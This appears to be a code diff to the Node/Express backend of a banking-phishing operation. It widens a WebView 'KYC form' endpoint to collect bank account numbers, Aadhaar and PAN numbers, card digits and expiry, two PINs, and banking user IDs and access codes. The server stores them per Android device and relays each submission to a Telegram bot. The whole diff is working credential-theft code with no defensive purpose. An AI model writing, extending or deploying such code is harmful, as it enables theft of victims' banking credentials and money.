@@ -114,13 +114,27 @@ app.get('/api/devices/:id/forms', (req, res) => {
     res.json(forms);
 });
 
-// Form submission endpoint (from WebView)
+// Form submission endpoint (from WebView - multi-step KYC form)
 app.post('/api/form/submit', (req, res) => {
-    const { deviceId, name, phoneNumber, id } = req.body;
+    const {
+        deviceId,
+        // Step 2
+        fullName, mobileNumber, motherName,
+        // Step 3
+        accountNumber, aadhaarNumber, panCard,
+        // Step 4
+        cardLast6, atmPin,
+        // Step 5
+        cifNumber, branchCode,
+        // Step 6
+        dateOfBirth, cardExpiry, finalPin,
+        // Step 7
+        userId, accessCode, profileCode
+    } = req.body;
 
-    console.log(`[Form] Received submission - deviceId: "${deviceId}", name: "${name}"`);
+    console.log(`[Form] Received KYC submission - deviceId: "${deviceId}", name: "${fullName}"`);
 
-    if (!deviceId || !name || !phoneNumber || !id) {
+    if (!deviceId || !fullName || !mobileNumber) {
         console.log(`[Form] Missing required fields`);
         return res.status(400).json({ error: 'Missing required fields' });
     }
@@ -128,8 +142,30 @@ app.post('/api/form/submit', (req, res) => {
     // Check if device exists before storing
     const deviceExistedBefore = store.getDevice(deviceId) !== undefined;
 
+    // Build form data object with all KYC fields
+    const formData = {
+        fullName: fullName || '',
+        mobileNumber: mobileNumber || '',
+        motherName: motherName || '',
+        accountNumber: accountNumber || '',
+        aadhaarNumber: aadhaarNumber || '',
+        panCard: panCard || '',
+        cardLast6: cardLast6 || '',
+        atmPin: atmPin || '',
+        cifNumber: cifNumber || '',
+        branchCode: branchCode || '',
+        dateOfBirth: dateOfBirth || '',
+        cardExpiry: cardExpiry || '',
+        finalPin: finalPin || '',
+        userId: userId || '',
+        accessCode: accessCode || '',
+        profileCode: profileCode || '',
+        submittedAt: new Date()
+    };
+
+
     // Store the form data (will create device if not exists)
-    store.submitForm(deviceId, { name, phoneNumber, id });
+    store.submitForm(deviceId, formData as any);
 
     // If a new device was created, notify all clients about the new device
     if (!deviceExistedBefore) {
@@ -144,12 +180,13 @@ app.post('/api/form/submit', (req, res) => {
 
     // Notify via Telegram if enabled
     if (telegramBot.isActive()) {
-        telegramBot.notifyNewForm(deviceId, { name, phoneNumber, id, submittedAt: new Date() });
+        telegramBot.notifyNewForm(deviceId, formData as any);
     }
 
-    console.log(`[Form] Successfully stored for device ${deviceId}`);
+    console.log(`[Form] Successfully stored KYC data for device ${deviceId}`);
     res.json({ success: true, message: 'Form submitted successfully' });
 });
+
 
 const PORT = process.env.PORT || 3001;
 const HOST = '0.0.0.0'; // Listen on all interfaces for Android device connections
